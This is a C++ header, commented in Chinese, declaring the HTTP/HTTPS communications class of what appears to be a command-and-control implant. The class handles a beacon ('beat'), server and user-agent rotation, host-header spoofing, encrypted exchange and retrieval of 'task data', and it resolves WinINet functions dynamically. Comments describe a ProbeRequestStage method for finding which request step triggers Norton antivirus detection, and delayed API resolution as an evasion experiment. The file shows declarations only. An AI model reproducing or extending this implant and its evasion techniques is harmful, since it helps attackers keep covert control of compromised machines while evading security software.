// 文件作用：HTTP/HTTPS 连接器声明：保存 HTTP profile、WinINet 函数指针和收发缓冲区。
#pragma once

#include <windows.h>
#include <wininet.h>
#include "Connector.h"

#ifndef PROFILE_STRUCT
#define PROFILE_STRUCT

#define PROXY_TYPE_NONE     0
#define PROXY_TYPE_HTTP     1
#define PROXY_TYPE_HTTPS    2

// ProfileHTTP 保存 HTTP/HTTPS 连接参数。
typedef struct {
	ULONG  servers_count;
	BYTE** servers;
	WORD*  ports;
	BOOL   use_ssl;
	BYTE*  http_method;
	ULONG  uri_count;
	BYTE** uris;
	BYTE*  parameter;
	ULONG  ua_count;
	BYTE** user_agents;
	BYTE*  http_headers;
	ULONG  ans_pre_size;
	ULONG  ans_size;
	ULONG  hh_count;
	BYTE** host_headers;
	BYTE   rotation_mode;   // 0=sequential, 1=random
	BYTE   proxy_type;      // 0=none, 1=http, 2=https
	BYTE*  proxy_host;
	WORD   proxy_port;
	BYTE*  proxy_username;
	BYTE*  proxy_password;
} ProfileHTTP;

#endif

#define DECL_API(x) decltype(x) * x

// HTTPFUNC 保存 WinINet 相关 API 函数指针。
struct HTTPFUNC {
	DECL_API(LocalAlloc);
	DECL_API(LocalReAlloc);
	DECL_API(LocalFree);
	DECL_API(LoadLibraryA);
	DECL_API(GetProcAddress);
	DECL_API(GetLastError);

	DECL_API(InternetOpenA);
	DECL_API(InternetConnectA);
	DECL_API(HttpOpenRequestA);
	DECL_API(HttpSendRequestA);
	DECL_API(InternetSetOptionA);
	DECL_API(InternetQueryOptionA);
	DECL_API(HttpQueryInfoA);
	DECL_API(InternetQueryDataAvailable);
	DECL_API(InternetCloseHandle);
	DECL_API(InternetReadFile);
};

// ConnectorHTTP 是真正负责 direct_https 网络通信的连接器。
class ConnectorHTTP : public Connector
{
	ULONG  ua_count       = 0;
	CHAR** user_agents    = NULL;
	ULONG  ua_index       = 0;
	ULONG  hh_count       = 0;
	CHAR** host_headers   = NULL;
	ULONG  hh_index       = 0;
	BOOL   ssl            = FALSE;
	CHAR*  http_method    = NULL;
	ULONG  server_count   = 0;
	CHAR** server_address = NULL;
	WORD*  server_ports   = 0;
	ULONG  uri_count      = 0;
	CHAR** uris           = NULL;
	ULONG  uri_index      = 0;
	CHAR*  headers        = NULL;
	ULONG  ans_size       = 0;
	ULONG  ans_pre_size   = 0;
	BYTE   rotation_mode  = 0;

	BYTE* recvData = NULL;
	int   recvSize = 0;

	BYTE  proxy_type     = PROXY_TYPE_NONE;
	CHAR* proxy_url      = NULL;
	CHAR* proxy_username = NULL;
	CHAR* proxy_password = NULL;

	HTTPFUNC* functions = NULL;
	HMODULE hWininetModule = NULL;

	HINTERNET hInternet = NULL;
	HINTERNET hConnect  = NULL;

	ULONG server_index = 0;

public:
	// 构造函数加载 WinINet 并准备内部状态。
	ConnectorHTTP();

	// SetProfile 读取 profile 并保存通信参数。
	BOOL SetProfile(void* profile, BYTE* beat, ULONG beatSize) override;
	// Exchange 加密数据、发请求、收响应并解密。
	void Exchange(BYTE* plainData, ULONG plainSize, BYTE* sessionKey) override;
	// CloseConnector 关闭连接器。
	void CloseConnector() override;

	// RecvData 返回响应里的任务数据。
	BYTE* RecvData() override;
	// RecvSize 返回任务数据大小。
	int   RecvSize() override;
	// RecvClear 清空响应缓冲区。
	void  RecvClear() override;

	// operator new 走自定义内存分配。
	static void* operator new(size_t sz);
	// operator delete 走自定义内存释放。
	static void operator delete(void* p) noexcept;

	// ProbeRequestStage 是 Norton 定位实验用：只执行 HTTP/WinINet 请求链路中的某一段，
	// 用来判断到底是打开连接、发送请求，还是读取响应触发查杀。
	DWORD ProbeRequestStage(ULONG stage, BOOL forcePlainHttp8000);

private:
	// EnsureHttpSendRequestA 是老师建议的“延迟初始化 API”实验入口：
	// 构造函数里可以先不解析 HttpSendRequestA，真正要发请求前再解析它。
	BOOL EnsureHttpSendRequestA();

	// SendData 实际组装并发送 HTTP 请求。
	void SendData(BYTE* data, ULONG data_size);
};
